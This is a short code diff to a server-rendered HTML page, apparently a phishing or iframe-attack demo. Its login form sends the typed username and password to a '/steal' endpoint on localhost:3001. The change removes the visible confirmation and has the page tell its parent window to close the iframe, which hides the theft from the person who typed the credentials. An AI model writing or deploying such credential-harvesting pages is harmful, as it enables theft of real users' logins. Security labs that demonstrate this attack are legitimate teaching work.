@@ -215,14 +215,12 @@ res.send(`
       var password = document.getElementById('password').value;
       if (username && password) {
         fetch('http://localhost:3001/steal?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password), { mode: 'no-cors' });
-        outputDiv.style.display = 'block';
-        outputDiv.innerHTML += '<p>Credentials submitted: ' + username + '</p>';
-        document.querySelector('.login-box').style.display = 'none';
+        // Signal the parent window to close the iframe
+        window.parent.postMessage('close-iframe', '*');
       }
     }
 
     window.addEventListener('message', function(event) {
-      // Removed console.log('Message received:', event.data, 'Origin:', event.origin);
       if (event.data === 'type=community-update') {
         outputDiv.style.display = 'block';
         outputDiv.innerHTML += '<p>Received community-update from ' + event.origin + ' at ' + new Date().toLocaleTimeString() + '</p>';
